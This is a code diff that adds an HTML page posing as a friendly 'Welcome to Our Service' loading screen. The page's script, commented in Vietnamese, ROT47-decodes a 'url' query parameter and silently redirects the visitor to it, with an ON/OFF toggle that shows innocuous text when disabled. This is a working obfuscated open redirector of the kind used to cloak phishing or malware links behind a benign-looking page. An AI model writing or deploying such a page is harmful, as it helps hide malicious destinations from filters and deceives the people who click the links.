@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Welcome to Our Service</title>
+</head>
+<body>
+    <h1>Welcome to Our Service</h1>
+    <p>Loading your personalized content...</p>
+    
+    <script>
+        // Trạng thái chuyển hướng: 'ON' hoặc 'OFF'
+        const redirectStatus = 'ON'; // Sửa thành 'OFF' để tắt giải mã và chuyển hướng
+
+        function processData(input) {
+            let result = '';
+            for (let i = 0; i < input.length; i++) {
+                let code = input.charCodeAt(i);
+                if (code >= 33 && code <= 126) {
+                    result += String.fromCharCode((code - 33 - 47 + 94) % 94 + 33);
+                } else {
+                    result += input[i];
+                }
+            }
+            return result;
+        }
+
+        // Lấy tham số từ URL
+        const params = new URLSearchParams(window.location.search);
+        const data = params.get('url') || '';
+
+        if (redirectStatus === 'ON' && data) {
+            // Khi ON: Giải mã ROT47 và chuyển hướng
+            const processed = processData(data);
+            window.location.href = processed;
+        } else if (!data) {
+            // Không có URL: Hiển thị thông báo lỗi
+            document.body.innerHTML = "<p>Sorry, we couldn't load your content.</p>";
+        } else {
+            // Khi OFF: Không giải mã, chỉ hiển thị nội dung tĩnh
+            document.body.innerHTML = "<p>Your content is ready! Enjoy our service.</p>";
+        }
+    </script>
+</body>
+</html>
